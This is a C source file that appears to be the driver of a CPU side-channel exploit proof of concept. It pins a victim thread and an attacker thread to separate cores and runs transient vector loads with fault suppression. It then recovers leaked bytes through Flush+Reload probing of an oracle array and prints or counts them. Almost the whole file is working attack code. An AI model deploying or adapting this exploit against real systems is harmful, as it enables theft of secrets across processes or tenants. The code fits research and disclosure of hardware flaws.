#include "header.h"
#define PAGE_SIZE 4096

uint32_t perm[16] = {0};
uint32_t pindex[16] = {0};




void set_cpu(int cpuid)
{
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(cpuid, &cpuset);
    int result = pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpuset);
    if (result != 0) {
        printf("pthread_setaffinity_np failed!");
        exit(1);
    }
}

void * victim(void * ptr)
{
    set_cpu(CPU_VICTIM);
    
    if(!setjmp(trycatch_buf)) VICTIM_ROUTINE();

}


void intHandler(int dummy) {
    printf("\n");
    map_dump();
    exit(0);
}


int main(int argc, char *argv[])
{

    setup_fh();

    pthread_t tVictim;
    pthread_create(&tVictim, NULL, victim, NULL);
    for(int i = 0; i < 10000000; i++);
    
    set_cpu(CPU_ATTACKER);

    signal(SIGINT, intHandler);
    setup_oracle();    
    setup_throttle();
    map_create();
    

    for(int i = 0; i < 16; i++){
        perm[i] = i + atoi(argv[1]);
    }

    int t = atoi(argv[2]);
     
    while (1) {
        for(int i = 0; i < 16; i++)
           pindex[i] =  i * t;

        if(!setjmp(trycatch_buf)) 
          for(int x = 0; x < LOAD_COUNT; x++)
            s_load_encode(perm, pindex);
        
        char indexes[BYTE_TRY+1];
        memset(indexes, 0, BYTE_TRY+1);

        for(size_t c = 0; c < BYTE_TRY; c++){
            for(size_t i = 0; i < 256; i++){
                int mix_i = i;
                if (flush_reload((uint8_t *)&oracles + (mix_i+(c*256))*PAGE_SIZE)) {
                    indexes[c] = (mix_i+(c*256)) % 256;
                }
            }
        }
        
        size_t l = strlen(indexes);
        #if !SILENT_MODE
        if(l >= atoi(argv[3]))
        {
            for(size_t i = 0; i < l; i++){
                fprintf(stdout, "%02x ", (uint8_t)indexes[i]);
            }
            fprintf(stdout, "%s %lu\n", indexes, l);
            fflush(stdout);
        }
        #else
        if(l >= atoi(argv[3]))
        {
            map_increment(indexes);
        }
        #endif

    }
    return 0;
}


